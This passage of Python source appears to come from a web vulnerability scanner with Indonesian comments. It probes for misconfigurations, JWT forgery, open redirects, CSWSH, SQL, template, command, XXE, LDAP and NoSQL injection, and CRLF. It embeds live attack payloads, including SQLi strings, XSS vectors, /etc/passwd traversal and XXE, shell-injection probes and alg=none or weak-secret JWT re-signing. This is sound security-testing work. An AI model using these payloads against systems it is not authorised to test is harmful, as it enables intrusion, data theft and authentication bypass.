              cwe=cwe, owasp="A05:2021 Security Misconfiguration", cvss=cvss,
              remed=remed, confidence="confirmed" if matched else "probable",
              location=path))


def c_directory_listing(ctx, add):
    for path in ["/uploads/", "/backup/", "/files/", "/static/", "/images/",
                 "/media/", "/assets/", "/data/", "/download/", "/documents/"]:
        r = ctx.client.get(path)
        if r.status == 200 and not ctx.is_missing(r) and re.search(
                r"Index of /|Directory listing for|<title>Index of|Parent Directory</a>", r.body):
            add(F("MEDIUM", f"Directory listing enabled: {path}",
                  'An attacker can inventory all files in this directory.',
                  evidence='listing signature detected and not a soft-404',
                  cwe="CWE-548", owasp="A05:2021 Security Misconfiguration", cvss=5.3,
                  remed='Disable autoindex at the web server.',
                  confidence="confirmed", location=path))


def c_admin_panels(ctx, add):
    for path in ["/admin", "/admin/login", "/administrator", "/manager/html",
                 "/wp-login.php", "/cpanel", "/console", "/admin/dashboard",
                 "/user/login", "/auth/login"]:
        r = ctx.client.get(path)
        if r.status == 200 and r.body and not ctx.is_missing(r) and re.search(
                r'type=["\']password["\']|sign in|log ?in', r.body, re.I):
            add(F("MEDIUM", f"Admin/login panel exposed: {path}",
                  'Ensure the panel is protected by rate limiting, MFA, and IP restrictions. A real password form was found (not a disguised 404 page).',
                  evidence=f"HTTP 200 with a password form", cwe="CWE-1188",
                  owasp="A07:2021 Identification & Authentication Failures", cvss=5.3,
                  remed='Restrict access via IP/VPN; enable MFA; rate-limit logins.',
                  confidence="confirmed", location=path))


def c_http_methods(ctx, add):
    r = ctx.client.request("OPTIONS", "/")
    allow = r.hdr("allow")
    risky = [m for m in ("PUT", "DELETE", "TRACE", "CONNECT") if m in allow.upper()]
    if risky:
        add(F("MEDIUM", f"Risky HTTP method allowed: {', '.join(risky)}",
              f"Allow header announces: {allow}. This method should be disabled if unused.",
              evidence=f"Allow: {allow}", cwe="CWE-650", owasp="A05:2021", cvss=5.3,
              remed='Restrict methods in the web server configuration.',
              confidence="probable", location="/"))
    # TRACE aktif sungguhan (XST): payload header harus terpantul di body
    mk = ctx.marker
    tr = ctx.client.request("TRACE", "/", headers={"X-PTK-Trace": mk})
    if tr.status and mk in (tr.body or ""):
        add(F("MEDIUM", 'HTTP TRACE enabled (XST possible)',
              'The TRACE response reflects the sent headers — Cross-Site Tracing is possible.',
              evidence=f"TRACE -> {tr.status}, marker reflected", cwe="CWE-693",
              owasp="A05:2021", cvss=5.3, remed='Disable TRACE at the web server.',
              confidence="confirmed", location="/"))
    # WebDAV aktif: PROPFIND yang dijawab multistatus = DAV berjalan (sering tak disadari)
    pf = ctx.client.request("PROPFIND", "/", headers={"Depth": "1"})
    if pf.status == 207 or "multistatus" in (pf.body or "")[:2000].lower():
        add(F("MEDIUM", 'WebDAV enabled (PROPFIND responds)',
              'PROPFIND returned a multistatus — WebDAV is running on the web server. Unmonitored DAV can become a file upload/overwrite path.',
              evidence=f"PROPFIND / -> {pf.status}", cwe="CWE-650",
              owasp="A05:2021", cvss=5.3,
              remed='Disable WebDAV if unused; if used, require authentication.',
              confidence="confirmed", location="/"))


def c_open_redirect(ctx, add):
    evil = "evil.example.com"
    surf = ctx.surface(full=True)
    cands = []
    for pq in surf.param_urls:
        base, names = crawl_mod.params_of(pq)
        for n in names:
            if n.lower() in crawl_mod.URL_PARAM_NAMES or "redir" in n.lower() or "return" in n.lower():
                cands.append((base, n))
    for p in crawl_mod.REDIRECT_PATHS:
        for n in ["url", "next", "redirect", "returnTo", "return", "target"]:
            cands.append((p, n))
    seen = set()
    for base, pname in cands:
        if (base, pname) in seen or ctx.cancelled():
            continue
        seen.add((base, pname))
        for payload in [f"https://{evil}", f"//{evil}", f"https:{evil}"]:
            r = ctx.req_param(base, pname, payload)
            loc = r.hdr("location")
            if r.status in (301, 302, 303, 307, 308) and urlparse(loc).hostname == evil:
                add(F("HIGH", f"Open Redirect: {base} param '{pname}'",
                      'Redirect follows user input without domain validation.',
                      evidence=f"Location: {loc}", cwe="CWE-601",
                      owasp="A01:2021 Broken Access Control", cvss=6.1,
                      remed='Whitelist redirect targets; do not use absolute URLs from input.',
                      confidence="confirmed", location=base, param=pname))
                return


def c_csrf_forms(ctx, add):
    surf = ctx.surface(full=True)
    for form in surf.forms:
        if form["method"] != "POST":
            continue
        names = [i.lower() for i in form["inputs"]]
        if any("token" in n or "csrf" in n or "authenticity" in n or "_nonce" in n
               for n in names):
            continue
        add(F("MEDIUM", f"POST form without anti-CSRF token: {form['action']}",
              f"Form at {form['page']} (input: {', '.join(form['inputs'][:6]) or '-'}) does not contain a detected CSRF token field. If this form changes state and relies on a session cookie, it is vulnerable to CSRF.",
              evidence=f"inputs={form['inputs'][:6]}", cwe="CWE-352",
              owasp="A01:2021 Broken Access Control", cvss=6.5,
              remed='Add a per-session CSRF token verified by the server + SameSite cookies.',
              confidence="probable", location=form["action"]))


def _b64url_json(s):
    try:
        pad = "=" * (-len(s) % 4)
        return json.loads(base64.urlsafe_b64decode(s + pad))
    except Exception:
        return None


JWT_WEAK_SECRETS = ["secret", "password", "changeme", "key", "jwtsecret",
                    "your-secret-key", "secretkey", "123456", "admin", "supersecret"]


def c_jwt_analysis(ctx, add):
    tokens = set()
    r = ctx.surface(full=False).homepage or ctx.client.get("/")
    for src in [r.body or ""] + r.hdr_all("set-cookie"):
        for m in re.finditer(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*", src):
            tokens.add(m.group(0))
    for tok in list(tokens)[:3]:
        parts = tok.split(".")
        header, payload = _b64url_json(parts[0]), _b64url_json(parts[1])
        if not header or payload is None:
            continue
        alg = str(header.get("alg", "")).lower()
        loc = 'JWT in response/cookie'
        if alg == "none":
            add(F("CRITICAL", 'JWT with alg=none',
                  'The token is unsigned — anyone can forge the payload.',
                  evidence=tok[:60] + "…", cwe="CWE-347", owasp="A07:2021", cvss=9.1,
                  remed='Reject alg=none; enforce a strong algorithm on the server.',
                  confidence="confirmed", location=loc))
            continue
        if alg.startswith("hs") and len(parts) == 3 and parts[2]:
            sig = parts[2]
            for secret in JWT_WEAK_SECRETS:
                mac = hmac_mod.new(secret.encode(),
                                   f"{parts[0]}.{parts[1]}".encode(), hashlib.sha256)
                expect = base64.urlsafe_b64encode(mac.digest()).rstrip(b"=").decode()
                if hmac_mod.compare_digest(expect, sig):
                    add(F("CRITICAL", f"JWT HMAC weak secret: '{secret}'",
                          'The JWT signature was successfully verified with a secret from a common wordlist.',
                          evidence=f"alg={alg}, secret matched from the built-in wordlist",
                          cwe="CWE-798", owasp="A07:2021", cvss=9.8,
                          remed='Replace the secret with a random value >=32 bytes; rotate active tokens.',
                          confidence="confirmed", location=loc))
                    break
        if isinstance(payload, dict) and "exp" not in payload:
            add(F("MEDIUM", 'JWT without exp claim',
                  'A token without expiry can be used forever if leaked.',
                  evidence=f"payload keys: {', '.join(list(payload)[:8])}", cwe="CWE-613",
                  owasp="A07:2021", cvss=5.3,
                  remed='Set a short exp + revocable refresh tokens.',
                  confidence="confirmed", location=loc))


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _find_jwts(ctx):
    tokens = set()
    r = ctx.surface(full=False).homepage or ctx.client.get("/")
    for src in [r.body or ""] + r.hdr_all("set-cookie"):
        for m in re.finditer(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*", src):
            tokens.add(m.group(0))
    return list(tokens)[:3]


def c_jwt_forgery(ctx, add):
    """Verifikasi aktif pemalsuan JWT: endpoint identitas harus menerima
    token ASLI dan memantulkan klaim identitasnya (baseline). Baru kemudian
    dua teknik pemalsuan diuji — alg=none dan tanda-tangan ulang dengan
    secret lemah. Hanya pantulan identitas PALSU yang menjadi temuan
    confirmed; endpoint ketat tidak menghasilkan apa-apa."""
    for tok in _find_jwts(ctx):
        parts = tok.split(".")
        if len(parts) != 3:
            continue
        header, payload = _b64url_json(parts[0]), _b64url_json(parts[1])
        if not header or not isinstance(payload, dict):
            continue
        idkey = next((k for k in ("user", "sub", "id", "username", "email")
                      if k in payload), None)
        if not idkey:
            continue

        def probe(ep, token):
            return ctx.client.request(
                "GET", ep, headers={"Authorization": f"Bearer {token}"})

        for ep in ("/api/me", "/api/user", "/api/profile", "/api/auth/me",
                   "/api/v1/me", "/me"):
            try:
                r0 = probe(ep, tok)
            except Exception:
                continue
            if r0.status != 200 or str(payload[idkey]) not in (r0.body or ""):
                continue  # baseline tidak terbukti di endpoint ini
            forged_val = "ptk-forged-admin"
            forged_payload = dict(payload, **{idkey: forged_val})
            # (a) alg=none
            none_tok = "{}.{}.".format(
                _b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()),
                _b64url_encode(json.dumps(forged_payload).encode()))
            try:
                r1 = probe(ep, none_tok)
            except Exception:
                r1 = None
            if r1 is not None and r1.status == 200 and forged_val in (r1.body or ""):
                add(F("CRITICAL", f"JWT can be forged (alg=none accepted): {ep}",
                      'The endpoint accepts an alg=none token with no signature and reflects a forged identity — authentication can be fully bypassed.',
                      evidence=f"forged identity '{forged_val}' accepted at {ep}",
                      cwe="CWE-347", owasp="A07:2021", cvss=9.8,
                      remed='Reject alg=none; signature verification is mandatory on all endpoints.',
                      confidence="confirmed", location=ep))
            # (b) tanda tangan ulang dengan secret lemah dari wordlist
            if str(header.get("alg", "")).lower().startswith("hs"):
                for secret in JWT_WEAK_SECRETS:
                    mac = hmac_mod.new(secret.encode(),
                                       f"{parts[0]}.{parts[1]}".encode(), hashlib.sha256)
                    if not hmac_mod.compare_digest(
                            _b64url_encode(mac.digest()), parts[2]):
                        continue
                    signing = "{}.{}".format(
                        parts[0], _b64url_encode(json.dumps(forged_payload).encode()))
                    mac2 = hmac_mod.new(secret.encode(), signing.encode(), hashlib.sha256)
                    forged_tok = f"{signing}.{_b64url_encode(mac2.digest())}"
                    try:
                        r2 = probe(ep, forged_tok)
                    except Exception:
                        r2 = None
                    if r2 is not None and r2.status == 200 and forged_val in (r2.body or ""):
                        add(F("CRITICAL",
                              f"JWT can be forged (weak secret, token re-signed): {ep}",
                              'The HMAC secret is in a common wordlist, so a token can be re-signed with any identity and accepted by the server.',
                              evidence=f"re-signed with secret '{secret}' accepted at {ep}",
                              cwe="CWE-798", owasp="A07:2021", cvss=9.8,
                              remed='Replace the secret with a random value >=32 bytes; rotate active tokens.',
                              confidence="confirmed", location=ep))
                    break
            return  # baseline endpoint ketemu & diuji — selesai


def c_websocket_surface(ctx, add):
    """Permukaan WebSocket: URL ws(s) dikumpulkan crawler dari HTML/JS;
    handshake Upgrade dibuktikan (101 + Sec-WebSocket-Accept valid),
    lalu validasi Origin diuji dengan Origin asing (indikasi CSWSH)."""
    import base64 as _b64
    import hashlib as _hl
    import os as _os
    surf = ctx.surface()
    targets = []
    for u in (surf.ws_urls or [])[:3]:
        p = urlparse(u)
        if p.hostname == ctx.client.host:
            targets.append((u, (p.path or "/") + (("?" + p.query) if p.query else "")))
    if not targets:
        targets = [(f"ws://{ctx.client.host}/ws", "/ws")]
    GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    for label, full in targets[:3]:
        key = _b64.b64encode(_os.urandom(16)).decode()
        hdrs = {"Connection": "Upgrade", "Upgrade": "websocket",
                "Sec-WebSocket-Key": key, "Sec-WebSocket-Version": "13"}
        try:
            r = ctx.client.request("GET", full, headers=hdrs)
        except Exception:
            continue
        expect = _b64.b64encode(_hl.sha1((key + GUID).encode()).digest()).decode()
        if r.status != 101 or r.hdr("sec-websocket-accept") != expect:
            continue
        add(F("LOW", f"Active WebSocket endpoint: {label}",
              'The WebSocket handshake succeeded (101 Switching Protocols with a valid Sec-WebSocket-Accept) without initial authentication. If this channel carries session data, per-message authentication and authorization are required.',
              evidence="handshake 101 + accept valid", cwe="CWE-1385",
              owasp="A05:2021", cvss=3.7,
              remed='Require authentication at the handshake and authorization per message.',
              confidence="confirmed", location=full))
        try:
            r2 = ctx.client.request("GET", full, headers={
                **hdrs, "Origin": "https://evil.invalid"})
        except Exception:
            r2 = None
        if r2 is not None and r2.status == 101:
            add(F("MEDIUM", f"WebSocket accepts cross-origin connections (CSWSH indication): {label}",
                  "A handshake with a foreign Origin was still accepted (101) — the server does not validate Origin, so a malicious site could hijack an authenticated user's WebSocket connection (CSWSH).",
                  evidence="Origin https://evil.invalid -> 101", cwe="CWE-1385",
                  owasp="A05:2021", cvss=6.5,
                  remed='Validate the Origin header against an allowlist during the handshake.',
                  confidence="probable", location=full))


def c_api_exposure(ctx, add):
    ctx.soft404()
    docs = {
        "/swagger-ui.html": "Swagger UI", "/swagger-ui/": "Swagger UI",
        "/swagger": "Swagger UI", "/openapi.json": "OpenAPI spec",
        "/swagger.json": "Swagger spec", "/v3/api-docs": "OpenAPI v3 docs",
        "/v2/api-docs": "Swagger v2 docs", "/api-docs": "API docs",
        "/redoc": "ReDoc", "/docs": "API docs",
    }
    for path, label in docs.items():
        r = ctx.client.get(path)
        if r.status != 200 or ctx.is_missing(r) or not r.body:
            continue
        sig = re.search(r'"(openapi|swagger)"\s*:|swagger-ui|redoc|openapi', r.body, re.I)
        if sig:
            add(F("MEDIUM", f"API documentation exposed: {label} ({path})",
                  'A public API spec/UI maps all endpoints for an attacker. If the API is intentionally public this may be acceptable — assess the risk.',
                  evidence=f"HTTP 200, signature: {sig.group(0)[:40]}", cwe="CWE-200",
                  owasp="A05:2021", cvss=5.3,
                  remed='Restrict API docs to the internal network / require authentication.',
                  confidence="confirmed", location=path))
            break
    # GraphQL introspection — verifikasi nyata dengan query introspeksi
    for gpath in ["/graphql", "/api/graphql", "/graphiql"]:
        r = ctx.client.get(gpath)
        if r.status == 404 or ctx.is_missing(r):
            continue
        q = '{"query":"{__schema{queryType{name}}}"}'
        resp = ctx.client.post(gpath, data=q,
                               headers={"Content-Type": "application/json"})
        if resp.status == 200 and "__schema" in (resp.body or ""):
            add(F("HIGH", f"GraphQL introspection enabled: {gpath}",
                  'The entire GraphQL schema is publicly readable — an attacker can map all available queries/mutations.',
                  evidence='__schema reflected from an introspection query', cwe="CWE-200",
                  owasp="A05:2021", cvss=7.5,
                  remed='Disable introspection in production; limit query depth/complexity.',
                  confidence="confirmed", location=gpath))
            return
        if r.status == 200 and "graphql" in (r.body or "").lower():
            add(F("LOW", f"Endpoint GraphQL reachable: {gpath}",
                  'The GraphQL endpoint responds publicly (introspection not confirmed).',
                  evidence=f"GET {gpath} -> 200", cwe="CWE-200", owasp="A05:2021",
                  cvss=3.1, remed='Ensure authentication and rate limiting on the GraphQL endpoint.',
                  confidence="probable", location=gpath))
            return


# ------------------------------------------------------------ active: injection suite

def _sql_error_in(body, baseline_body=""):
    low = (body or "").lower()
    blow = (baseline_body or "").lower()
    return [e for e in SQL_ERRORS if e in low and e not in blow]


def c_web_injection(ctx, add):
    """Suite injeksi terverifikasi: SQLi (error/boolean/time), XSS, SSTI, LFI, CMDi.
    Setiap teknik berhenti per-parameter begitu terkonfirmasi, tetapi parameter &
    teknik lain TETAP diuji (perbaikan dari v2 yang return di temuan pertama)."""
    targets = ctx.param_targets(limit=30)
    ctx.L(f"  [injection] {len(targets)} target parameters from crawl")
    time_tested = 0
    for base, pname, method, orig in targets:
        if ctx.cancelled():
            return
        loc = base
        def R(value):
            return ctx.req_param(base, pname, value, method, orig)
        baseline = R("1")
        bbody = baseline.body or ""
        # Konteks respons: refleksi verbatim payload (mis. echo JSON) menipu
        # uji diferensial — bandingkan SETELAH payload dibuang dari body.
        def _unrefl(body, value):
            if not body or not value:
                return body or ""
            out = body.replace(value, "\x00")
            try:
                from urllib.parse import quote as _q
                out = out.replace(_q(value), "\x00")
            except Exception:
                pass
            return out
        _ctype = (baseline.hdr("content-type") or "").lower()
        _is_json = "json" in _ctype
        # Stabilitas baseline: halaman yang berubah-ubah antar request (iklan,
        # timestamp, rotasi konten) membuat uji boolean/time rawan FP — ukur dulu.
        baseline2 = R("1")
        stable = similarity(bbody, baseline2.body or "") > 0.80
        if not stable:
            ctx.L(f"  [injection] baseline {base}?{pname} NOT stable — boolean/time tests skipped for this parameter")
        # Gate catch-all/SPA: bila respons parameter ini identik dengan shell
        # soft-404 (semua path = halaman yang sama) dan nilai acak tidak
        # berpengaruh sama sekali, parameter ini tidak nyata — lewati seluruh
        # uji untuk menghindari FP massal ala v3.2.0.
        junk = f"ptkjunk{ctx.marker}"
        rj = R(junk)
        soft = ctx.soft404()
        if soft is not None and similarity(bbody, soft.body or "") > 0.98 \
                and junk not in (rj.body or "") \
                and similarity(rj.body or "", bbody) > 0.995:
            ctx.L(f"  [injection] {base}?{pname} = shell catch-all (SPA gate) — skipped")
            continue
        # ---------- SQLi error-based (multi-payload, bandingkan baseline)
        sqli_found = False
        for payload in ["1'", '1"', "1')", "1' OR '1'='1"]:
            r = R(payload)
            errs = _sql_error_in(r.body, bbody)
            if errs:
                add(F("CRITICAL", f"SQL Injection (error-based): {base} param '{pname}'",
                      'The injection payload triggered a database error message that does not appear in the baseline.',
                      evidence=f"payload={payload!r} -> error: {errs[0]}",
                      cwe="CWE-89", owasp="A03:2021 Injection", cvss=9.8,
                      remed='Use parameterized queries/prepared statements.',
                      confidence="confirmed", location=loc, param=pname))
                sqli_found = True
                break
        # ---------- SQLi UNION-based (hitung kolom: N cocok + N besar gagal)
        if not sqli_found and stable:
            ok_cols = []
            for n in range(1, 7):
                cols = ",".join(["NULL"] * n)
                _pay = f"1' UNION SELECT {cols}-- -"
                r = R(_pay)
                if r.status == 200 and not _sql_error_in(r.body, bbody) \
                        and similarity(_unrefl(r.body, _pay), bbody) > 0.45:
                    ok_cols.append(n)
            if ok_cols:
                cols10 = ",".join(["NULL"] * 10)
                _pay10 = f"1' UNION SELECT {cols10}-- -"
                rb = R(_pay10)
                broken = rb.status != 200 or bool(_sql_error_in(rb.body, bbody)) \
                    or similarity(_unrefl(rb.body, _pay10), bbody) < 0.45
                if broken:
                    add(F("CRITICAL", f"SQL Injection (UNION-based, {ok_cols[0]} columns): {base} param '{pname}'",
                          f"UNION SELECT with {ok_cols[0]} columns accepted (similar to baseline) while 10 columns were rejected — the query structure can be manipulated to extract data from other tables.",
                          evidence=f"matching columns: {ok_cols}, 10 columns: rejected",
                          cwe="CWE-89", owasp="A03:2021 Injection", cvss=9.8,
                          remed='Use parameterized queries/prepared statements.',
                          confidence="confirmed", location=loc, param=pname))
                    sqli_found = True
        # ---------- SQLi boolean-based (pasangan true/false vs baseline)
        if not sqli_found and stable:
            rt = R("1 AND 1=1")
            rf = R("1 AND 1=2")
            if rt.status and rf.status and rt.body != rf.body:
                sim_t = similarity(_unrefl(rt.body, "1 AND 1=1"), bbody)
                sim_f = similarity(_unrefl(rf.body, "1 AND 1=2"), bbody)
                if sim_t > 0.90 and sim_f < 0.75:
                    add(F("CRITICAL", f"SQL Injection (boolean-based): {base} param '{pname}'",
                          'The TRUE-condition response is very similar to the baseline while the FALSE condition differs greatly — the query can be manipulated logically.',
                          evidence=f"sim(true,base)={sim_t:.2f} sim(false,base)={sim_f:.2f}",
                          cwe="CWE-89", owasp="A03:2021 Injection", cvss=9.8,
                          remed='Use parameterized queries/prepared statements.',
                          confidence="confirmed", location=loc, param=pname))
                    sqli_found = True
        # ---------- SQLi time-based STATISTIK (median 3 baseline, konfirmasi ulang)
        if not sqli_found and stable and time_tested < 3:
            time_tested += 1
            samples = sorted([baseline.elapsed, baseline2.elapsed, R("1").elapsed])
            base_med = samples[1]
            for payload in SQL_TIME_PAYLOADS[:3]:
                r = R(payload)
                if r.elapsed >= 2.6 and r.elapsed > base_med + 2.4:
                    r2 = R(payload)
                    if r2.elapsed >= 2.6 and r2.elapsed > base_med + 2.4:
                        add(F("CRITICAL", f"SQL Injection (time-based): {base} param '{pname}'",
                              f"The sleep payload delayed the response twice in a row, far above the baseline median of {base_med:.2f} dtk (3 sampel).",
                              evidence=f"payload={payload!r} elapsed={r.elapsed:.1f}s/{r2.elapsed:.1f}s median={base_med:.2f}s",
                              cwe="CWE-89", owasp="A03:2021 Injection", cvss=9.8,
                              remed='Use parameterized queries/prepared statements.',
                              confidence="confirmed", location=loc, param=pname))
                        sqli_found = True
                        break
        # ---------- XSS reflected (multi-konteks, marker unik per scan)
        mk = ctx.marker
        xss_payloads = [
            f'"><svg/onload=ptk{mk}>',
            f"'<svg/onload=ptk{mk}>",
            f"<svg/onload=ptk{mk}>",
            f'"><img src=x onerror=ptk{mk}>',
        ]
        for payload in xss_payloads:
            if _is_json:
                ctx.L(f"  [injection] {base}?{pname}: JSON response — reflection inside an escaped JSON string is not an HTML context, XSS test skipped")
                break
            r = R(payload)
            if payload in (r.body or ""):
                add(F("HIGH", f"Reflected XSS verified: {base} param '{pname}'",
                      'The payload was reflected INTACT without HTML encoding — the per-scan unique marker was found exactly as sent.',
                      evidence=payload[:90], cwe="CWE-79", owasp="A03:2021 Injection",
                      cvss=8.1, remed='Encode output by context (HTML/attr/JS). Add a CSP. Use auto-escaping templates.',
                      confidence="confirmed", location=loc, param=pname))
                break
        # ---------- SSTI (hasil komputasi harus muncul, literal payload tidak)
        a, b = ctx.num_a, ctx.num_b
        expect = str(a * b)
        for tpl in [f"{{{{{a}*{b}}}}}", f"${{{a}*{b}}}", f"#{{{a}*{b}}}"]:
            r = R(tpl)
            if expect in (r.body or "") and tpl not in r.body and expect not in bbody:
                add(F("CRITICAL", f"Server-Side Template Injection: {base} param '{pname}'",
                      f"Ekspresi template {tpl} evaluated by the server to {expect}.",
                      evidence=f"{tpl} -> {expect} in the response", cwe="CWE-94",
                      owasp="A03:2021 Injection", cvss=9.8,
                      remed='Do not render user input as a template; use a sandboxed/logic-less engine.',
                      confidence="confirmed", location=loc, param=pname))
                break
        # ---------- Path traversal / LFI (signature file sistem)
        for payload in ["../../../../etc/passwd", "....//....//....//etc/passwd",
                        "..%2f..%2f..%2fetc%2fpasswd",
                        "..\\..\\..\\..\\windows\\win.ini"]:
            r = R(payload)
            body = r.body or ""
            if re.search(r"root:.*?:0:0:", body) or "[extensions]" in body and "win.ini" in payload:
                kind = "LFI/Path Traversal"
                add(F("CRITICAL", f"{kind} verified: {base} param '{pname}'",
                      'System file contents outside the webroot were successfully read via the parameter.',
                      evidence=f"payload={payload!r} -> system file signature found",
                      cwe="CWE-22", owasp="A01:2021 Broken Access Control", cvss=8.6,
                      remed='Whitelist file names; do not concatenate input into paths; chroot/jail the file directory.',
                      confidence="confirmed", location=loc, param=pname))
                break
        # ---------- Command injection
        # Bukti terkuat DULU: output komputasi $((a*b)) — hasil kali TIDAK ada di
        # dalam request, jadi refleksi (termasuk echo URL-encoded) tidak bisa
        # memalsukannya. Echo marker hanya cadangan dengan anti-refleksi
        # ternormalisasi (unquote + unescape) — v3.2.0 terkecoh echo URI encoded.
        from urllib.parse import unquote as _uq
        import html as _html

        def _reflected(payload, body):
            b = body or ""
            return payload in b or payload in _uq(b) or payload in _html.unescape(b)

        cmk = f"PTK{mk}"
        cmd_found = False
        ca, cb = ctx.num_a, ctx.num_b
        prod = str(ca * cb)
        for payload in [f"1;echo $(({ca}*{cb}))", f"1|echo $(({ca}*{cb}))",
                        f"1&&echo $(({ca}*{cb}))"]:
            r = R(payload)
            if prod in (r.body or "") and f"$(({ca}*{cb}))" not in (r.body or "") \
                    and prod not in bbody and not _reflected(payload, r.body):
                add(F("CRITICAL", f"Command Injection verified: {base} param '{pname}'",
                      f"Ekspresi shell $(({ca}*{cb})) evaluated by the server to {prod} — this computed result is not in the request, so it is not a reflection.",
                      evidence=f"payload={payload!r} -> output {prod}", cwe="CWE-78",
                      owasp="A03:2021 Injection", cvss=9.8,
                      remed="Hindari shell; pakai API library & whitelist argumen.",
                      confidence="confirmed", location=loc, param=pname))
                cmd_found = True
                break
        if not cmd_found:
            for payload in [f"1;echo {cmk}", f"1|echo {cmk}", f"1$(echo {cmk})",
                            f"1`echo {cmk}`"]:
                r = R(payload)
                # marker harus muncul TANPA payload terpantul dalam bentuk apapun
                # (mentah, URL-decoded, maupun HTML-unescaped).
                if cmk in (r.body or "") and not _reflected(payload, r.body) \
                        and cmk not in bbody:
                    add(F("CRITICAL", f"Command Injection verified: {base} param '{pname}'",
                          'Command marker reflected in the response — input is executed by the shell.',
                          evidence=f"payload={payload!r} -> marker reflected", cwe="CWE-78",
                          owasp="A03:2021 Injection", cvss=9.8,
                          remed="Hindari shell; pakai API library & whitelist argumen.",
                          confidence="confirmed", location=loc, param=pname))
                    cmd_found = True
                    break
        if not cmd_found and time_tested <= 2:
            r = R("1; sleep 3")
            if r.elapsed >= 2.6 and r.elapsed > baseline.elapsed + 2.2:
                add(F("CRITICAL", f"Command Injection (time-based): {base} param '{pname}'",
                      'The sleep command consistently delays the response.',
                      evidence=f"elapsed={r.elapsed:.1f}s vs baseline {baseline.elapsed:.1f}s",
                      cwe="CWE-78", owasp="A03:2021 Injection", cvss=9.8,
                      remed="Hindari shell; pakai API library & whitelist argumen.",
                      confidence="probable", location=loc, param=pname))
        # ---------- XXE (POST XML ke endpoint parameter; entitas harus TER-EXPAND)
        xxe_body = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY ptk SYSTEM '
                    f'"file:///etc/passwd">]><r>&ptk;</r>')
        xr = ctx.client.post(base, data=xxe_body,
                             headers={"Content-Type": "application/xml"})
        if re.search(r"root:.*?:0:0:", xr.body or ""):
            add(F("CRITICAL", f"XML External Entity (XXE) verified: {base} param '{pname}'",
                  'The XML parser processes the external entity and returns the contents of /etc/passwd.',
                  evidence='signature /etc/passwd from entity &ptk;', cwe="CWE-611",
                  owasp="A05:2021 Security Misconfiguration", cvss=9.1,
                  remed='Disable DTD/external entities in the XML parser (defusedxml / feature off).',
                  confidence="confirmed", location=loc, param=pname))
        # ---------- LDAP injection (signature error LDAP di respons, bukan di baseline)
        for payload in ["*)(|(objectClass=*)", "*)(&(|", "admin)(|(password=*"]:
            r = R(payload)
            low = (r.body or "").lower()
            if any(s in low for s in ("ldap_search", "ldap_bind", "invalid dn syntax",
                                      "javax.naming", "ldap: error code", "objectclass")) \
                    and "objectclass" not in bbody.lower():
                # 'objectclass' saja terlalu umum bila payload terpantul; wajib ada konteks error/naming
                if any(s in low for s in ("ldap_search", "ldap_bind", "invalid dn syntax",
                                          "javax.naming", "ldap: error code")):
                    add(F("HIGH", f"LDAP Injection (LDAP error indication): {base} param '{pname}'",
                          'The LDAP filter payload triggered an LDAP error/naming message from the backend.',
                          evidence=f"payload={payload!r}", cwe="CWE-90",
                          owasp="A03:2021 Injection", cvss=8.1,
                          remed='Escape LDAP special characters (&, (, ), *, \\\\) in input; use parameterized filters.',
                          confidence="probable", location=loc, param=pname))
                    break
        # ---------- NoSQL injection (operator Mongo sebagai nilai: respons berubah drastis)
        for payload in ['{"$gt": ""}', '{"$ne": null}']:
            r = R(payload)
            if r.status == 200 and baseline.status == 200 and r.body and bbody:
                sim = similarity(r.body, bbody)
                if sim < 0.55 and len(r.body) > len(bbody) * 1.3:
                    add(F("HIGH", f"NoSQL Injection (operator indication): {base} param '{pname}'",
                          f"The MongoDB operator value ($gt/$ne) drastically changes the result (similarity to baseline {sim:.2f}, response {len(r.body)} vs {len(bbody)} bytes) — indication that the NoSQL query accepts operators from input.",
                          evidence=f"payload={payload}", cwe="CWE-943",
                          owasp="A03:2021 Injection", cvss=8.1,
                          remed='Reject object/operator-typed values from input; sanitize $ and . in keys.',
                          confidence="probable", location=loc, param=pname))
                    break


def c_crlf_injection(ctx, add):
    targets = ctx.param_targets(limit=14)
    mk = ctx.marker
    for base, pname, method, orig in targets:
        # Payload CRLF MENTAH: req_param meng-quote nilai, jadi bila di sini
        # dipakai bentuk ter-encode (%0d%0a) hasilnya double-encode dan CRLF
        # tidak pernah benar-benar terkirim — bug yang membuat check ini mati
        # total sampai ketahuan battery ground-truth v3.4.
        payload = f"x\r\nX-PTK-Injected: {mk}"
        r = ctx.req_param(base, pname, payload, method, orig)
        for k, v in r.headers:
            if k.lower() == "x-ptk-injected" and mk in v:
                add(F("HIGH", f"CRLF / Response Splitting: {base} param '{pname}'",
                      'A new header was successfully injected into the response via CRLF in the parameter.',
                      evidence=f"X-PTK-Injected: {v}", cwe="CWE-113",
                      owasp="A03:2021 Injection", cvss=7.4,
                      remed='Reject CR/LF in all input that goes into response headers.',
                      confidence="confirmed", location=base, param=pname))
                return
        for raw in r.hdr_all("set-cookie"):
            if mk in raw and "x-ptk" in raw.lower():
                add(F("HIGH", f"CRLF / Response Splitting: {base} param '{pname}'",
                      'Injected CRLF content appears in Set-Cookie.',
                      evidence=raw[:120], cwe="CWE-113", owasp="A03:2021", cvss=7.4,
                      remed='Reject CR/LF in input that goes into headers.',
                      confidence="confirmed", location=base, param=pname))
                return


def c_blind_oob(ctx, add):
    """Blind SSRF/XXE via canary out-of-band (Fase 4): token unik ditanam ke
    parameter URL (SSRF) dan body XML (XXE). Temuan HANYA lahir dari callback
    sungguhan yang tercatat registry — tanpa callback, tidak ada klaim
    (buta berarti tidak terbukti, bukan aman). Canary tidak tersedia ->
    check menyatakan diri dilewati di log."""
    can = ctx.opts.get("canary") or {}
    reg, base = can.get("registry"), can.get("base")
    if not reg or not base:
        ctx.L("  [oob] canary listener not configured — blind SSRF/XXE "
              "skipped (declared, not assumed safe)")
        return
    planted = []
    n_ssrf = 0
    for pth, pname, method, orig in ctx.param_targets(limit=40):
        if pname.lower() not in crawl_mod.URL_PARAM_NAMES:
            continue
        tok = reg.issue(f"ssrf {pth} {pname}")
        try:
            ctx.req_param(pth, pname, reg.url(base, tok), method, orig)
        except Exception:
            continue
        planted.append((tok, "SSRF", pth, pname))
        n_ssrf += 1
        if n_ssrf >= 4:
            break
